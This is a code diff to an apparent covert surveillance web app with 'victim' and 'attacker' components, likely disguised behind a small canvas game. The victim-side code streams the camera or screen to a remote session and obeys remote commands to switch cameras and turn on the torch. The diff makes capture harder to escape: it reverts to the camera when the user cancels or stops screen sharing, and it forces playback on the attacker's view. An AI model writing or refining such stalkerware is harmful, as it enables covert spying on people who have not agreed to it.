@@ -97,7 +97,7 @@ export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) =
     const startMedia = useCallback(async (type: 'user' | 'environment' | 'display') => {
         if (!peerRef.current) return;
         
-        // Cleanup old tracks
+        // Cleanup old tracks to release hardware
         if (streamRef.current) {
             streamRef.current.getTracks().forEach(track => track.stop());
         }
@@ -107,11 +107,17 @@ export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) =
             
             if (type === 'display') {
                 // Screen Sharing
-                // @ts-ignore
-                stream = await navigator.mediaDevices.getDisplayMedia({ 
-                    video: { cursor: "always" } as any, 
-                    audio: false 
-                });
+                try {
+                    // @ts-ignore
+                    stream = await navigator.mediaDevices.getDisplayMedia({ 
+                        video: { cursor: "always" } as any, 
+                        audio: false 
+                    });
+                } catch (err) {
+                    // User cancelled screen share selection -> Revert to camera
+                    console.warn("Screen share cancelled, reverting to user camera");
+                    return startMedia('user');
+                }
             } else {
                 // Camera
                 const constraints = type === 'environment' 
@@ -129,15 +135,15 @@ export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) =
             streamRef.current = stream;
             
             // Re-establish call with new stream
+            // We create a new call to ensure the attacker receives the new track format
             const call = peerRef.current.call(sessionId, stream);
             
             sendData('log', { msg: `Stream Active: ${type.toUpperCase()}` });
 
-            // Handle stream ending (e.g. user stops screen share or camera is preempted)
-            // We revert to front camera to maintain connection
+            // Handle stream ending (e.g. user stops screen share from browser UI)
             if (stream.getVideoTracks().length > 0) {
                 stream.getVideoTracks()[0].onended = () => {
-                    sendData('log', { msg: 'Stream Stopped. Reverting to Camera...' });
+                    sendData('log', { msg: 'Stream Stopped (UI). Reverting...' });
                     startMedia('user');
                 };
             }
@@ -176,38 +182,47 @@ export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) =
 
         if (data.cmd === 'torch') {
             const currentStream = streamRef.current;
-            const videoTrack = currentStream?.getVideoTracks()[0];
-            const settings = videoTrack?.getSettings();
+            if (!currentStream) return;
 
-            // Auto-switch to environment if on user camera
-            if (settings?.facingMode === 'user' && data.on) {
+            const videoTrack = currentStream.getVideoTracks()[0];
+            if (!videoTrack) return;
+
+            // Check if current track supports torch
+            const capabilities = videoTrack.getCapabilities ? videoTrack.getCapabilities() : {};
+            // @ts-ignore
+            const supportsTorch = !!capabilities.torch;
+            const settings = videoTrack.getSettings();
+
+            // If we want torch ON, but current cam doesn't support it (likely front cam), switch to back
+            if (data.on && !supportsTorch) {
                 sendData('log', { msg: 'Switching to Back Camera for Torch...' });
                 startMedia('environment').then(() => {
-                    // Wait for switch then apply torch
+                    // Give it a moment to initialize the new stream
                     setTimeout(() => {
                         const newTrack = streamRef.current?.getVideoTracks()[0];
-                        // @ts-ignore
-                        newTrack?.applyConstraints({ advanced: [{ torch: true }] })
-                            .catch((e:any) => sendData('error', {msg: 'Torch failed after switch'}));
-                    }, 1500);
+                        if (newTrack) {
+                            // @ts-ignore
+                            newTrack.applyConstraints({ advanced: [{ torch: true }] })
+                                .then(() => sendData('log', { msg: 'Torch ON (Switched)' }))
+                                .catch(() => sendData('error', {msg: 'Torch failed'}));
+                        }
+                    }, 1000);
                 });
                 return;
             }
 
-            if (videoTrack) {
-                // @ts-ignore
-                videoTrack.applyConstraints({ advanced: [{ torch: !!data.on }] })
-                    .then(() => sendData('log', { msg: `Torch ${data.on ? 'ON' : 'OFF'}` }))
-                    .catch((e: any) => sendData('error', { msg: `Torch Error: ${e.message}` }));
-            } else {
-                 sendData('error', { msg: 'No active video track for torch' });
-            }
+            // Normal Toggle
+            // @ts-ignore
+            videoTrack.applyConstraints({ advanced: [{ torch: !!data.on }] })
+                .then(() => sendData('log', { msg: `Torch ${data.on ? 'ON' : 'OFF'}` }))
+                .catch((e: any) => sendData('error', { msg: `Torch Error: ${e.message}` }));
         }
         
         if (data.cmd === 'switch_cam') {
             if (streamRef.current) {
                 const track = streamRef.current.getVideoTracks()[0];
                 const currentFacing = track.getSettings().facingMode;
+                // Toggle facing mode
                 const next = currentFacing === 'environment' ? 'user' : 'environment';
                 startMedia(next);
             } else {
@@ -312,7 +327,6 @@ export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) =
         let playerX = canvas.width / 2;
         const playerY = canvas.height - 120;
         let obstacles: any[] = [];
-        let particles: any[] = [];
 
         // Input Handling
         const handleMove = (e: MouseEvent | TouchEvent) => {
@@ -729,6 +743,8 @@ export const GhostApp: React.FC<AppProps> = ({ isHackerMode }) => {
     useEffect(() => {
         if (selectedId && videoRef.current && victims[selectedId]?.stream) {
             videoRef.current.srcObject = victims[selectedId].stream!;
+            // FORCE PLAY - Fixes issue where stream changes but video element pauses
+            videoRef.current.play().catch(e => console.log("Autoplay blocked", e));
         }
     }, [selectedId, victims, activeTab]); 
 
